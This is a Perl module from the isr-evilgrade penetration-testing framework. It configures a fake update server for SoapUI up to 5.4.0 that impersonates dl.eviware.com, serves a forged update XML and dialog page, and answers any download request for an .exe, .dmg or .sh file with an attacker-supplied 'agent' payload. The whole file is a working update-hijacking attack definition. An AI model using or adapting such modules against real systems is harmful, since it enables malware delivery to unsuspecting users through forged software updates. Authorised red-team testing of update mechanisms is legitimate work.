###############
# soapui.pm
#
# Copyright 2018 Mike Cromwell
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::soapui;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'Bearsmart SoapUI',
    'version'     => '1.0',
    'appver'      => '<= 5.4.0',
    'author'      => ['Mike Cromwell'],
    'description' => qq{},
    'vh'          => '(dl.eviware.com)',
    'request'     => [
        {   'req'    => '/version-update/soapui-updates-os.xml',    #regex friendly
            'type'   => 'file',                  #file|string|agent|install
            'method' => '',                      #any
            'bin'    => 0,
            'string' => '',
            'parse'  => 1,
            'file' => './include/soapui/soapui_update.xml'
        },
        {   'req'    => '/version-update/versiontracker/update-dialog-os.html',    #regex friendly
            'type'   => 'file',                  #file|string|agent|install
            'method' => '',                      #any
            'bin'    => 0,
            'string' => '',
            'parse'  => 0,
            'file' => './include/soapui/update-dialog-os.html',
	    'aheader' => "Content-Type: text/html \r\n"
        },
        {   'req'    => '(.exe|.dmg|.sh)',               #regex friendly
            'type'   => 'agent',                     #file|string|agent|install
            'bin'    => 1,
            'method' => '',                         #any
            'string' => '',
            'parse'  => 0,
            'file' => './agent/agent.exe'
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent.exe',
            'desc' => 'Agent to inject (exe, dmg or sh)'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
